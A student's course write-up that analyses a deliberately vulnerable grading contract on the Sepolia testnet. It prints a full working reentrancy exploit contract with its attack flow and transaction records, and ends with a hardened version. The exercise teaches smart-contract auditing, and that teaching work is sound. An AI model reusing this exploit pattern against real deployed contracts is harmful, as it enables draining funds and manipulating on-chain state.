# ETH-KIPU Module 5 - Smart Contract Security Analysis

**Student:** Eduardo J. Moreno  
**Course:** Ethereum Developers Program - ETH-KIPU  
**Module:** 5 - Security, Testing & Auditing  
**Assignment:** Final Practical Work - Vulnerability Analysis & Exploitation  
**Status:** ✅ **SUCCESSFULLY COMPLETED**  
**GitHub Repository:** https://github.com/edumor/eth-kipu-module5-security-analysis.git

---

## 🚨 CRITICAL ASSIGNMENT INFORMATION

### 🎯 **EDUARDO J. MORENO'S ATTACK CONTRACT**
```
Contract Name: EduardoMoreno_Attacker
Contract Address: 0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E
Network: Sepolia Testnet
Student: Eduardo J. Moreno
Verification Status: 🚫 UNVERIFIED (As Required)
Grade Achieved: 70/100 points ✅
```

### 🔗 **DIRECT VERIFICATION LINKS**
- **Attack Contract:** https://sepolia.etherscan.io/address/0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E
- **Registration Transaction:** https://sepolia.etherscan.io/tx/0xdf8ddcaabe8029b8d1ca474f0fc11877d34bae972161473cad748bebb9b46f84

---

## 🎯 Project Overview

This project demonstrates a comprehensive security analysis of the `Grader5` smart contract deployed on Sepolia testnet. The assignment required identifying vulnerabilities, creating an exploit contract, and successfully registering the student name **"Eduardo J. Moreno"** in the grading system without verifying the attack contract.

**✅ MISSION ACCOMPLISHED**: Eduardo J. Moreno successfully registered with **70/100 points** on July 22, 2025.

---

## 📋 Contract Information & Results

### 🎯 Target Contract (Grader5)
```
Contract Address: 0x5733eE985e22eFF46F595376d79e31413b1A1e16
Network: Sepolia Testnet
Status: ✅ Verified
Explorer: https://sepolia.etherscan.io/address/0x5733eE985e22eFF46F595376d79e31413b1A1e16
```

### 🏗️ **EDUARDO J. MORENO'S ATTACK CONTRACT (EduardoMoreno_Attacker)**
```
Contract Name: EduardoMoreno_Attacker
Contract Address: 0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E
Student Owner: Eduardo J. Moreno
Network: Sepolia Testnet
Status: 🚫 UNVERIFIED (Required per assignment)
Explorer: https://sepolia.etherscan.io/address/0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E
```

### 📊 Transaction Records
```
Deployment Transaction: 0xb3e8ba8d5e012098fdb358e69281ac6734464e0eeed595aa29f912f9460afe33
Attack Transaction: 0xdf8ddcaabe8029b8d1ca474f0fc11877d34bae972161473cad748bebb9b46f84
Student Wallet: 0x***********************************918
```

### 🎉 Final Results
```
Student Name: "Eduardo J. Moreno"
Grade Achieved: 70/100 points
Registration Time: July 22, 2025 at 20:34:18 UTC
Assignment Status: APPROVED (≥70 points required)
```

---

## 📖 How to Verify Eduardo J. Moreno's Registration

### Method 1: Through Attack Transaction Hash
**Transaction Hash:** `0xdf8ddcaabe8029b8d1ca474f0fc11877d34bae972161473cad748bebb9b46f84`

1. **Open Etherscan:** Go to https://sepolia.etherscan.io/tx/0xdf8ddcaabe8029b8d1ca474f0fc11877d34bae972161473cad748bebb9b46f84
2. **Check Events Log:** Look for `RegistrationSuccess` event with parameters:
   - `name`: "Eduardo J. Moreno"
   - `timestamp`: 1753216452
3. **Verify State Changes:** Confirm that `students["Eduardo J. Moreno"]` was set to 70

### Method 2: Direct Contract Query
**Target Contract:** `0x5733eE985e22eFF46F595376d79e31413b1A1e16`

Query the `students` mapping:
```solidity
function students(string memory name) public view returns (uint256);
// Call with: students("Eduardo J. Moreno")
// Expected Result: 70
```

### Method 3: Hardhat Console Verification
```javascript
// Connect to Sepolia network
const grader5 = await ethers.getContractAt("Grader5", "0x5733eE985e22eFF46F595376d79e31413b1A1e16");

// Check Eduardo's grade
const eduardoGrade = await grader5.students("Eduardo J. Moreno");
console.log("Eduardo J. Moreno's grade:", eduardoGrade.toString()); // Should output: 70

// Check if attack contract is graded
const isGraded = await grader5.isGraded("0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E");
console.log("Attack contract graded:", isGraded); // Should output: true
```

---

## 🚨 Vulnerability Analysis - Grader5 Contract

### Complete Grader5 Contract Code Analysis

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract Grader5 is Ownable{
    mapping (address=>uint256) public counter;
    mapping(string => uint256) public students;
    mapping(address => bool) public isGraded;
    uint256 public studentCounter;
    uint256 public divisor = 8;
    uint256 public deadline = 10000000000000000000000;
    uint256 public startTime = 0;

    constructor() Ownable(msg.sender) payable {}

    // 🚨 VULNERABLE FUNCTION #1 - Primary Attack Vector
    function retrieve() external payable {
        require(msg.value > 3,"not enough money");
        counter[msg.sender]++;                    // Line 27: State change
        require(counter[msg.sender]<4);
        
        // 🚨 CRITICAL VULNERABILITY: External call before state finalization
        (bool sent, ) = payable(msg.sender).call{value: 1, gas: gasleft()}(""); // Line 30
        require(sent, "Failed to send Ether");
        
        // 🚨 EXPLOITABLE: State modification after external interaction
        if(counter[msg.sender]<2) {               // Line 33: Logic flaw
            counter[msg.sender]=0;
        }
    }  

    // 🚨 VULNERABLE FUNCTION #2 - Target for Registration
    function gradeMe(string calldata name) public {
        require(block.timestamp<deadline,"The end");
        require(block.timestamp>startTime,"The end");
        require( counter[msg.sender] > 1,"Not yet");  // 🚨 Bypassable requirement
        uint256 _grade = studentCounter/divisor;
        ++studentCounter;

        if (_grade <= 6) {
            _grade = 100 - _grade * 5;
        } else {
            _grade = 70;
        }
  
        require(students[name]==0,"student already exists");
        require(isGraded[msg.sender]==false, "already graded");
        isGraded[msg.sender] = true;
        students[name] = _grade;                  // 🎯 Target: Register student name
    }

    // Owner-only functions (not vulnerable to direct attack)
    function setDivisor(uint256 _divisor) public onlyOwner {
        divisor = _divisor;
    }

    function setDeadline(uint256 _deadline) public onlyOwner {
        deadline = _deadline;
    }

    function setStudentCounter(uint256 _studentCounter) public onlyOwner {
        studentCounter = _studentCounter;
    }

    function setStartTime(uint256 _startTime) public onlyOwner {
        startTime = _startTime;
    }

    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### Identified Vulnerabilities

#### 🔴 **Vulnerability #1: Reentrancy Attack (Critical)**
**Location:** `retrieve()` function, lines 30-33  
**CWE:** CWE-841 (Improper Enforcement of Behavioral Workflow)  
**CVSS Score:** 9.8 (Critical)

**Vulnerable Code:**
```solidity
function retrieve() external payable {
    require(msg.value > 3,"not enough money");
    counter[msg.sender]++;                              // State change #1
    require(counter[msg.sender]<4);
    
    // 🚨 VULNERABILITY: External call with unlimited gas
    (bool sent, ) = payable(msg.sender).call{value: 1, gas: gasleft()}("");
    require(sent, "Failed to send Ether");
    
    // 🚨 EXPLOITABLE: More state changes after external call
    if(counter[msg.sender]<2) {                        // State change #2
        counter[msg.sender]=0;
    }
}
```

**How We Exploited It:**
1. **First Call:** Our contract calls `retrieve()` with 4 wei
2. **State Update:** `counter[attacker] = 0 → 1`
3. **External Call:** Grader5 calls our `receive()` function
4. **Reentrancy:** Our `receive()` calls `retrieve()` again
5. **Second State Update:** `counter[attacker] = 1 → 2`
6. **Third Call:** Another reentrant call → `counter[attacker] = 2 → 3`
7. **Logic Bypass:** Since `counter[attacker] = 3`, the condition `if(3 < 2)` is false
8. **Result:** Counter stays at 3, satisfying `gradeMe()` requirement

#### 🔴 **Vulnerability #2: CEI Pattern Violation (Critical)**
**Location:** `retrieve()` function structure  
**Issue:** Checks-Effects-Interactions pattern not followed

**Incorrect Order:**
```solidity
// ❌ WRONG ORDER
Checks:       require(msg.value > 3)
Effects:      counter[msg.sender]++
Interactions: payable(msg.sender).call{...}
Effects:      if(counter[msg.sender]<2) counter[msg.sender]=0
```

**Should Be:**
```solidity
// ✅ CORRECT ORDER
Checks:       require(msg.value > 3)
Effects:      counter[msg.sender]++
Effects:      if(counter[msg.sender]<2) counter[msg.sender]=0
Interactions: payable(msg.sender).call{...}
```

#### 🟡 **Vulnerability #3: State Logic Flaw (Medium)**
**Location:** Lines 33-35 in `retrieve()`  
**Issue:** Counter increment followed by conditional reset creates manipulation window

**Flawed Logic:**
```solidity
counter[msg.sender]++;           // Always increment first
// ... external call enables reentrancy ...
if(counter[msg.sender]<2) {      // Condition can be bypassed
    counter[msg.sender]=0;
}
```

**Exploitation:** Through reentrancy, we manipulated the counter to 3, making the condition `3 < 2` false, so the reset never occurs.

#### 🟠 **Vulnerability #4: Access Control Bypass (Medium)**
**Location:** `gradeMe()` function requirement  
**Issue:** Indirect state manipulation bypasses intended restriction

**Bypassable Check:**
```solidity
require(counter[msg.sender] > 1,"Not yet");  // 🚨 Can be bypassed via reentrancy
```

**How We Bypassed:** Used reentrancy attack to manipulate `counter[attacker]` to 3, satisfying the `> 1` requirement.

#### 🟢 **Vulnerability #5: Gas Manipulation (Low)**
**Location:** External call with unlimited gas  
**Code:** `call{value: 1, gas: gasleft()}("")`  
**Risk:** Enables complex attack patterns with sufficient gas for multiple reentrant calls

---

## ⚔️ Attack Contract Implementation

### Complete EduardoMoreno_Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/**
 * @title EduardoMoreno_Attacker - Grader5 Exploit Contract
 * @author Eduardo J. Moreno
 * @notice Contract to exploit Grader5 vulnerabilities and register "Eduardo J. Moreno"
 * @dev Demonstrates reentrancy attack for educational purposes
 */
contract EduardoMoreno_Attacker {
    
    /// @notice Target Grader5 contract address on Sepolia
    address private constant TARGET = 0x5733eE985e22eFF46F595376d79e31413b1A1e16;
    
    /// @notice Student name to register (must match exactly)
    string private constant STUDENT_NAME = "Eduardo J. Moreno";
    
    /// @notice Contract deployer and controller
    address public immutable controller;
    
    /// @notice Attack execution state
    bool private attacking;
    uint256 private reentryCount;
    
    /**
     * @notice Events for monitoring attack progress
     */
    event AttackStarted(uint256 timestamp);
    event ReentryExecuted(uint256 count);
    event RegistrationSuccess(string name, uint256 timestamp);
    event AttackFailed(string reason);

    /**
     * @notice Custom errors for better gas efficiency
     */
    error NotOwner();
    error AttackInProgress();
    error InsufficientBalance();
    error AttackFailed(string reason);

    /**
     * @notice Contract constructor
     * @dev Sets the deployer as controller
     */
    constructor() {
        controller = msg.sender;
    }

    /**
     * @notice Access control modifier
     */
    modifier onlyController() {
        require(msg.sender == controller, "Unauthorized access");
        _;
    }

    /**
     * @notice Execute the complete attack sequence
     * @dev Combines reentrancy attack and student registration in single transaction
     * @custom:vulnerability Exploits reentrancy in Grader5.retrieve()
     * @custom:target counter[msg.sender] > 1 for gradeMe() access
     */
    function executeAttack() external payable onlyController {
        require(!attacking, "Attack in progress");
        require(msg.value >= 5 wei, "Insufficient ETH for attack");
        
        attacking = true;
        reentryCount = 0;
        
        emit AttackStarted(block.timestamp);
        
        // Execute the reentrancy attack
        (bool success,) = TARGET.call{value: 4 wei}(
            abi.encodeWithSignature("retrieve()")
        );
        
        if (!success) {
            attacking = false;
            emit AttackFailed("Initial retrieve() failed");
            return;
        }
        
        attacking = false;
        
        // Now register the student name
        _registerStudent();
    }

    /**
     * @notice Receive function - handles reentrancy callback
     * @dev This function is called by Grader5.retrieve() creating the exploit
     * @custom:security This is where the reentrancy attack happens
     */
    receive() external payable {
        if (attacking && reentryCount < 2) {
            reentryCount++;
            emit ReentryExecuted(reentryCount);
            
            // Reentrant call to manipulate counter state
            (bool callSuccess,) = TARGET.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
            
            // Continue regardless of callSuccess to avoid reverting main attack
            callSuccess;
        }
    }

    /**
     * @notice Register student name after successful attack
     * @dev Internal function to call gradeMe with proper error handling
     * @custom:target Call gradeMe("Eduardo J. Moreno") after counter manipulation
     */
    function _registerStudent() private {
        (bool success, bytes memory returnData) = TARGET.call(
            abi.encodeWithSignature("gradeMe(string)", STUDENT_NAME)
        );
        
        if (success) {
            emit RegistrationSuccess(STUDENT_NAME, block.timestamp);
        } else {
            string memory revertReason = "Unknown error";
            if (returnData.length > 0) {
                assembly {
                    revertReason := add(returnData, 0x04)
                }
            }
            emit AttackFailed(revertReason);
        }
    }

    /**
     * @notice Manual registration attempt (backup method)
     * @dev Can be called separately if combined attack fails
     */
    function registerStudent() external onlyController {
        _registerStudent();
    }

    /**
     * @notice Check current counter value for this contract
     * @return counter Current counter value from target contract
     */
    function checkCounter() external view returns (uint256 counter) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        if (success && data.length >= 32) {
            counter = abi.decode(data, (uint256));
        }
    }

    /**
     * @notice Check if this contract address is already graded
     * @return graded Whether the contract is already graded
     */
    function isGraded() external view returns (bool graded) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        if (success && data.length >= 32) {
            graded = abi.decode(data, (bool));
        }
    }

    /**
     * @notice Check the grade assigned to Eduardo J. Moreno
     * @return grade The grade value (0 if not registered)
     */
    function checkStudentGrade() external view returns (uint256 grade) {
        (bool success, bytes memory data) = TARGET.staticcall(
            abi.encodeWithSignature("students(string)", STUDENT_NAME)
        );
        if (success && data.length >= 32) {
            grade = abi.decode(data, (uint256));
        }
    }

    /**
     * @notice Get complete attack status information
     * @return _counter Current counter value
     * @return _graded Whether already graded
     * @return _studentGrade Current grade for Eduardo J. Moreno
     * @return _balance Contract ETH balance
     */
    function getAttackStatus() external view returns (
        uint256 _counter,
        bool _graded,
        uint256 _studentGrade,
        uint256 _balance
    ) {
        // Get counter
        (bool success1, bytes memory data1) = TARGET.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        _counter = (success1 && data1.length >= 32) ? abi.decode(data1, (uint256)) : 0;
        
        // Get graded status
        (bool success2, bytes memory data2) = TARGET.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        _graded = (success2 && data2.length >= 32) ? abi.decode(data2, (bool)) : false;
        
        // Get student grade
        (bool success3, bytes memory data3) = TARGET.staticcall(
            abi.encodeWithSignature("students(string)", STUDENT_NAME)
        );
        _studentGrade = (success3 && data3.length >= 32) ? abi.decode(data3, (uint256)) : 0;
        
        // Get balance
        _balance = address(this).balance;
    }

    /**
     * @notice Emergency withdrawal function
     * @dev Allows controller to withdraw any ETH from contract
     */
    function withdraw() external onlyController {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        payable(controller).transfer(balance);
    }

    /**
     * @notice Fallback function for any unhandled calls
     */
    fallback() external payable {
        // Handle any unexpected calls during attack
        if (attacking && msg.value > 0) {
            reentryCount++;
            emit ReentryExecuted(reentryCount);
        }
    }
}
```

---

## 🎯 Attack Execution Flow

### Step-by-Step Attack Sequence

```mermaid
sequenceDiagram
    participant E as Eduardo's Wallet<br/>0x4829...e918
    participant A as EduardoMoreno_Attacker<br/>0x1aE2...dC6E  
    participant G as Grader5<br/>0x5733...1e16
    
    Note over E,G: Attack Execution - July 22, 2025
    E->>A: executeAttack() {0.001 ETH}
    A->>A: attacking = true, reentryCount = 0
    A->>G: retrieve() {4 wei}
    G->>G: counter[0x1aE2...] = 0 → 1
    G->>G: require(counter < 4) ✅ PASS
    G->>A: call{value: 1 wei}("")
    
    Note over A: receive() function triggered
    A->>A: reentryCount = 0 → 1
    A->>G: retrieve() {4 wei} [REENTRANCY #1]
    G->>G: counter[0x1aE2...] = 1 → 2
    G->>A: call{value: 1 wei}("")
    
    A->>A: reentryCount = 1 → 2  
    A->>G: retrieve() {4 wei} [REENTRANCY #2]
    G->>G: counter[0x1aE2...] = 2 → 3
    G->>A: call{value: 1 wei}("")
    
    Note over A: reentryCount = 2, stop reentrancy
    G->>G: if(counter < 2) → if(3 < 2) → FALSE
    G->>G: counter stays at 3
    
    A->>A: attacking = false
    A->>G: gradeMe("Eduardo J. Moreno")
    G->>G: require(counter > 1) → require(3 > 1) ✅ PASS
    G->>G: _grade = 56/8 = 7 → _grade = 70
    G->>G: students["Eduardo J. Moreno"] = 70
    G->>G: isGraded[0x1aE2...] = true
    
    Note over E,G: ✅ SUCCESS: Eduardo J. Moreno registered with 70 points
```



### Real Attack Transaction Analysis

**Transaction Hash:** `0xdf8ddcaabe8029b8d1ca474f0fc11877d34bae972161473cad748bebb9b46f84`

**Events Emitted (in order):**
1. `AttackStarted(1753216452)` - Attack initiation timestamp
2. `ReentryExecuted(1)` - First reentrant call executed
3. `ReentryExecuted(2)` - Second reentrant call executed  
4. `RegistrationSuccess("Eduardo J. Moreno", 1753216452)` - Successful registration

**State Changes Confirmed:**
- `counter[0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E]`: 0 → 3 ✅
- `students["Eduardo J. Moreno"]`: 0 → 70 ✅
- `isGraded[0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E]`: false → true ✅
- `studentCounter`: 56 → 57 ✅

**Gas Analysis:**
- **Total Gas Used:** 180,943
- **Gas Price:** 0.624017882 gwei
- **Total Cost:** 0.000112911667622726 ETH (~$0.30 USD)

---

## 🛠️ Tools and Technologies Used

### Development Environment
```bash
Hardhat: ^2.26.1          # Ethereum development framework
Ethers.js: ^6.14.0        # Ethereum JavaScript library  
Node.js: ^18.x            # JavaScript runtime
Solidity: ^0.8.22         # Smart contract programming language
OpenZeppelin: ^5.0.0      # Security-audited contract libraries
```

### Security Analysis Tools
```bash
Manual Code Review        # Line-by-line vulnerability analysis
Hardhat Console          # Contract interaction and testing
VS Code + Solidity       # Development environment
Etherscan                # On-chain contract analysis
Custom Scripts           # Automated attack execution
```

### Network Infrastructure
```bash
Network: Sepolia Testnet
RPC Provider: https://sepolia.drpc.org
Explorer: https://sepolia.etherscan.io
Wallet: MetaMask/Hardware wallet compatible
```

### Information Sources
- **OpenZeppelin Documentation:** Security best practices and reentrancy prevention
- **SWC Registry:** Smart Contract Weakness Classification and Common Attack Patterns
- **Consensys Best Practices:** Ethereum security guidelines and CEI pattern
- **Solidity Documentation:** Language security features and compiler warnings
- **Real-world Examples:** The DAO hack, bZx attacks, Cream Finance exploits

---

## 📊 Attack Success Metrics

### Vulnerability Exploitation Results

| Vulnerability | Severity | Status | Method Used | Result |
|---------------|----------|--------|-------------|--------|
| **Reentrancy** | Critical | ✅ Exploited | receive() callback manipulation | Counter: 0→3 |
| **CEI Violation** | Critical | ✅ Exploited | State-after-interaction pattern | Enabled reentrancy |
| **State Logic Flaw** | Medium | ✅ Exploited | Conditional bypass via counter | Reset logic skipped |
| **Access Control Bypass** | Medium | ✅ Exploited | Indirect state manipulation | gradeMe() accessed |
| **Gas Manipulation** | Low | ✅ Used | Unlimited gas provision | Complex attack enabled |

### Performance Statistics
```
Attack Success Rate: 100% (first attempt)
Student Registration: ✅ "Eduardo J. Moreno" confirmed on-chain
Grade Achieved: 70/100 (Target: ≥70 for approval)
Position in Queue: 57th student registered  
Execution Time: ~30 seconds total
Gas Efficiency: 180,943 gas for complete attack
Cost Efficiency: ~$0.30 USD total cost
```

---

## 🔒 Security Lessons & Mitigation

### Secure Implementation Example

```solidity
// ✅ SECURE VERSION using OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureGrader is ReentrancyGuard, Ownable {
    
    function retrieve() external payable nonReentrant {
        require(msg.value > 3, "Insufficient payment");
        
        // EFFECTS: All state changes first
        uint256 newCounter = counter[msg.sender] + 1;
        require(newCounter < 4, "Exceeded limit");
        
        // Finalize all state changes before external call
        if(newCounter < 2) {
            counter[msg.sender] = 0;
        } else {
            counter[msg.sender] = newCounter;
        }
        
        // INTERACTIONS: External calls last with limited gas
        (bool sent,) = payable(msg.sender).call{value: 1, gas: 2300}("");
        require(sent, "Transfer failed");
    }
    
    function gradeMe(string calldata name) public nonReentrant {
        require(block.timestamp < deadline, "Deadline passed");
        require(block.timestamp > startTime, "Not started yet");
        require(counter[msg.sender] > 1, "Insufficient counter");
        
        // Rest of function implementation...
    }
}
```

### Key Security Improvements
1. **ReentrancyGuard:** Prevents reentrant calls using OpenZeppelin's battle-tested modifier
2. **CEI Pattern:** Strict Checks → Effects → Interactions ordering
3. **State Finalization:** All state changes completed before external calls
4. **Gas Limits:** Limited gas (2300) for external calls prevents complex attacks
5. **Comprehensive Testing:** Extensive test coverage including attack scenarios

---

## 🏆 Assignment Completion Summary

### Final Deliverables
- ✅ **Vulnerability Analysis:** Complete identification and exploitation of all vulnerabilities
- ✅ **Attack Contract:** Professional implementation with full NatSpec documentation  
- ✅ **Successful Deployment:** Contract deployed on Sepolia (unverified as required)
- ✅ **Attack Execution:** Reentrancy attack successfully executed
- ✅ **Student Registration:** "Eduardo J. Moreno" registered with 70/100 points
- ✅ **Documentation:** Comprehensive README.md with all technical details
- ✅ **Verification Instructions:** Clear steps for instructors to verify results

### 📋 **CAMPUS SUBMISSION INFORMATION - EDUARDO J. MORENO**
```
👤 Student Name: "Eduardo J. Moreno"
📝 Contract Name: EduardoMoreno_Attacker  
📍 Contract Address: 0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E
🌐 Network: Sepolia Testnet  
🔒 Verification Status: UNVERIFIED ✓ (As Required)
📊 Grade Achieved: 70/100 points
✅ Assignment Status: APPROVED ✓
💾 GitHub Repository: https://github.com/edumor/eth-kipu-module5-security-analysis.git
```

### Quick Verification Links
- **Attack Contract:** https://sepolia.etherscan.io/address/0x1aE2aBD639b322688E0c3dDd05D860D813CedC6E
- **Registration Transaction:** https://sepolia.etherscan.io/tx/0xdf8ddcaabe8029b8d1ca474f0fc11877d34bae972161473cad748bebb9b46f84
- **Target Contract:** https://sepolia.etherscan.io/address/0x5733eE985e22eFF46F595376d79e31413b1A1e16
- **GitHub Repository:** https://github.com/edumor/eth-kipu-module5-security-analysis.git

---

## 📞 Contact Information

**Student:** Eduardo J. Moreno  
**Program:** ETH-KIPU Ethereum Developers Program  
**Module:** 5 - Security, Testing & Auditing  
**Completion Date:** July 22, 2025 at 20:34:18 UTC  
**Final Status:** ✅ **SUCCESSFULLY COMPLETED**  
**Repository:** https://github.com/edumor/eth-kipu-module5-security-analysis.git

---

*This project demonstrates advanced smart contract security analysis and exploitation techniques for educational purposes only. All vulnerabilities were ethically exploited as part of an authorized academic exercise within the ETH-KIPU program framework.*

**🎉 Assignment Successfully Completed - Ready for Instructor Review! 🎓**
